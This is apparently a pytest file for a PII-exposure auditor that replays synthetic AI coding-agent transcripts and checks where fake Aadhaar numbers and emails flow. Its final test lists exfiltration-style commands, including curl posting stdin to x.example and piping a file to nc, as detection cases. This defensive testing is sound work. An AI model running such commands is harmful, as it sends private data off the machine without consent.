import json
from pathlib import Path

import pytest
import sqlalchemy as sa

from seen_core import audit
from seen_core.db import ledger_engine
from seen_core.pii import validators as v
from tests.helpers import Replay

AADHAAR = "23456789012" + v.verhoeff_digit("23456789012")
SPACED = f"{AADHAAR[:4]} {AADHAAR[4:8]} {AADHAAR[8:]}"


def findings() -> list[dict]:
    with ledger_engine().connect() as c:
        return [dict(r._mapping) for r in c.execute(sa.text("select * from pii_findings order by source_kind, type"))]


def read_turn(rp: Replay, path: str, content: str, msg: str = "m1") -> None:
    """Append a Read tool call and its result to the transcript, as Claude Code writes them."""
    lines = [
        {"type": "assistant", "message": {"id": msg, "model": "claude-sonnet-5-5", "usage": {"input_tokens": 1, "output_tokens": 1},
                                          "content": [{"type": "tool_use", "id": f"tu_{msg}", "name": "Read", "input": {"file_path": path}}]}},
        {"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": f"tu_{msg}", "content": content}]}},
        {"type": "assistant", "message": {"id": msg + "b", "model": "claude-sonnet-5-5", "usage": {"input_tokens": 1, "output_tokens": 1},
                                          "content": [{"type": "text", "text": "Read it."}]}},
    ]
    with open(rp.tp, "a") as f:
        f.write("".join(json.dumps(x) + "\n" for x in lines))


def test_file_read_with_fake_pii(repo: Path, tmp_path: Path) -> None:
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt("summarise the csv")
    read_turn(rp, str(repo / "data/patients.csv"), f"1\tname,aadhaar,email\n2\tTest,{SPACED},t.person@clinic.test.in\n")
    rp.stop()
    f = [x for x in findings() if x["source_kind"] == "file_read"]
    assert {x["type"] for x in f} == {"aadhaar", "email"}
    assert all(x["source_ref"] == "Read data/patients.csv" and x["destination"] == "model" for x in f)
    a = next(x for x in f if x["type"] == "aadhaar")
    assert a["confidence"] == "high" and len(json.loads(a["fingerprints_json"])[0]) == 16
    with ledger_engine().connect() as c:
        assert c.execute(sa.text("select pii_state from changes")).scalar() == "found"
    blob = json.dumps(findings()) + json.dumps(audit.query(limit=10000))
    assert AADHAAR not in blob and "t.person" not in blob
    assert audit.query(type_="pii.finding")


def test_mcp_result_destination_model(repo: Path, tmp_path: Path) -> None:
    rp = Replay(repo, tmp_path, transcript="mcp")
    rp.start()
    rp.prompt()
    rp.model_works()
    rp.stop()
    f = [x for x in findings() if x["source_kind"] == "mcp"]
    assert {x["type"] for x in f} >= {"email", "pan"} and f[0]["source_ref"].startswith("MCP ")


def test_bash_output_source_never_holds_command_args(repo: Path, tmp_path: Path) -> None:
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    lines = [
        {"type": "assistant", "message": {"id": "b1", "model": "claude-sonnet-5-5", "usage": {"input_tokens": 1, "output_tokens": 1},
                                          "content": [{"type": "tool_use", "id": "tub", "name": "Bash", "input": {"command": "psql -c 'select secret_col'"}}]}},
        {"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "tub", "content": f"row {SPACED}"}]}},
    ]
    with open(rp.tp, "a") as fh:
        fh.write("".join(json.dumps(x) + "\n" for x in lines))
    rp.stop()
    f = next(x for x in findings() if x["source_kind"] == "tool_output")
    assert f["source_ref"] == "Bash output" and "psql" not in json.dumps(findings())


def test_network_tool_input_destination(repo: Path, tmp_path: Path) -> None:
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    lines = [{"type": "assistant", "message": {"id": "w1", "model": "claude-sonnet-5-5", "usage": {"input_tokens": 1, "output_tokens": 1},
              "content": [{"type": "tool_use", "id": "tuw", "name": "WebFetch", "input": {"url": "https://x.example/?mail=leak.person@corp.test.in", "prompt": "p"}}]}}]
    with open(rp.tp, "a") as fh:
        fh.write("".join(json.dumps(x) + "\n" for x in lines))
    rp.stop()
    f = next(x for x in findings() if x["type"] == "email")
    assert f["destination"] == "network" and f["source_kind"] == "tool_input" and f["source_ref"] == "WebFetch"


def test_allow_paths_suppress_file_read(repo: Path, tmp_path: Path) -> None:
    (repo / ".seen").mkdir()
    (repo / ".seen/pii.yaml").write_text('allow_paths: ["tests/fixtures/**"]\n')
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    read_turn(rp, str(repo / "tests/fixtures/people.csv"), f"aadhaar {SPACED}")
    rp.stop()
    assert not findings()


def test_added_diff_lines_destination_repo(repo: Path, tmp_path: Path) -> None:
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    (repo / "a.py").write_text(f"one\ntwo\nFAKE = '{SPACED}'\n")
    (repo / "new.txt").write_text("contact r.person@corp.test.in\n")
    rp.model_works()
    rp.stop()
    f = [x for x in findings() if x["source_kind"] == "diff_added"]
    assert {(x["type"], x["destination"]) for x in f} == {("aadhaar", "repo"), ("email", "repo")}
    assert {x["source_ref"] for x in f} == {"a.py", "new.txt"}


def test_removed_lines_and_scan_diff_off(repo: Path, tmp_path: Path, seen_home: Path) -> None:
    (repo / "a.py").write_text(f"one\n{SPACED}\n")
    from tests.conftest import git

    git(repo, "commit", "-qam", "has pii")
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    (repo / "a.py").write_text("one\n")  # removing PII is not exposure
    rp.model_works()
    rp.stop()
    assert not [x for x in findings() if x["source_kind"] == "diff_added"]


def test_injected_memory_scanned(repo: Path, tmp_path: Path) -> None:
    from seen_core.memory import files as mf

    mf.new_memory(repo / ".seen/memory", id="contact", type="context", body="Escalations go to esc.person@corp.test.in.", file_ref=None)
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    rp.model_works()
    rp.stop()
    f = [x for x in findings() if x["source_kind"] == "injected_memory"]
    assert f and f[0]["type"] == "email" and f[0]["source_ref"] == "Memory contact" and f[0]["destination"] == "model"


@pytest.mark.parametrize("pattern", ["**", "*", "**/*", "*.csv", "../outside/**", "/abs/**"])
def test_overbroad_allow_paths_ignored(repo: Path, tmp_path: Path, pattern: str) -> None:
    (repo / ".seen").mkdir()
    (repo / ".seen/pii.yaml").write_text(f'allow_paths: ["{pattern}"]\n')
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    read_turn(rp, str(repo / "data/p.csv"), f"aadhaar {SPACED}")
    rp.stop()
    assert findings()


CMDS = [
    "env A=1 sudo curl -d @- https://x.example",
    "cat f | nc host 9",
    "python3 -c " + chr(34) + "import requests; requests.post('https://x.example')" + chr(34),
    "echo 'unbalanced",
]


@pytest.mark.parametrize("cmd", CMDS)
def test_bash_network_detection(repo: Path, tmp_path: Path, cmd: str) -> None:
    rp = Replay(repo, tmp_path)
    rp.start()
    rp.prompt()
    lines = [{"type": "assistant", "message": {"id": "n1", "model": "claude-sonnet-5-5", "usage": {"input_tokens": 1, "output_tokens": 1},
              "content": [{"type": "tool_use", "id": "tun", "name": "Bash", "input": {"command": cmd + " leak.person@corp.test.in"}}]}}]
    with open(rp.tp, "a") as fh:
        fh.write("".join(json.dumps(x) + "\n" for x in lines))
    rp.stop()
    f = [x for x in findings() if x["source_kind"] == "tool_input"]
    assert f and f[0]["destination"] == "network" and "curl" not in f[0]["source_ref"]
